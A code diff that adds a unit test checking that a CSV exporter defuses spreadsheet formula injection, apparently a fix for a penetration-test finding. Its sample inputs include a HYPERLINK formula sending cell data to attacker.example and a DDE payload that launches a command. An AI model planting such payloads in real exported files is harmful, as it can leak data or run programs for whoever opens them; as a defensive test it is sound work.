@@ -97,6 +97,35 @@ test('CSV and JSON hold the same tables and values', () => {
   assert.equal(foodsJSON[0].name, 'Skyr, natur');
 });
 
+// Pentest F10: what a spreadsheet would run as a formula is written as text.
+test('toCSV neutralises formulas', () => {
+  const rows = [
+    { a: '=HYPERLINK("https://attacker.example/?d="&A2,"Details")' },
+    { a: '+cmd|\' /C calc\'!A0' },
+    { a: '@SUM(1+1)' },
+    { a: '-2+3' },
+    { a: '\t=1+1' },
+    { a: '\r=1+1' },
+    { a: -5 },
+    { a: '-5' },
+    { a: '+1.5' },
+    { a: 'Front Squat' },
+  ];
+  assert.equal(toCSV(['a'], rows), [
+    'a',
+    `"'=HYPERLINK(""https://attacker.example/?d=""&A2,""Details"")"`,
+    `"'+cmd|' /C calc'!A0"`,
+    `"'@SUM(1+1)"`,
+    `"'-2+3"`,
+    `"'\t=1+1"`,
+    `"'\r=1+1"`,
+    '-5',
+    '-5',
+    '+1.5',
+    'Front Squat',
+  ].join('\n') + '\n');
+});
+
 test('toCSV quotes cells with commas, quotes and line breaks', () => {
   assert.equal(toCSV(['a', 'b'], [{ a: 'x, "y"', b: null }, { a: 1.5, b: true }]), 'a,b\n"x, ""y""",\n1.5,true\n');
 });
